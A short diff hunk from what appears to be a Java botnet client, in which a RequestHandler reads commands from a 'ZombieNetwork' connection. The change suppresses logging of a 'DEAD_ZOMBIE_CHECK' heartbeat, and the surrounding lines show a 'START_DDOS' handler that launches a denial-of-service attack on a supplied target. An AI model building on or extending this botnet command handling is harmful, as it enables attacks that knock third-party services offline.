@@ -12,7 +12,8 @@ public class RequestHandler {
 	public static void handleRequest() throws ClassNotFoundException, IOException {
 		final DataPackage pkgIn = (DataPackage) ZombieNetwork.getClient().getInputStream().readObject();
 
-		System.out.println("Packet recieved: " + pkgIn.getMessage());
+		if (!pkgIn.getMessage().equals("DEAD_ZOMBIE_CHECK"))
+			System.out.println("Packet recieved: " + pkgIn.getMessage());
 
 		if (pkgIn.getMessage().equals("START_DDOS")) {
 			System.out.println("Starting DDoS on " + pkgIn.getObjects()[0] + " with packet size "
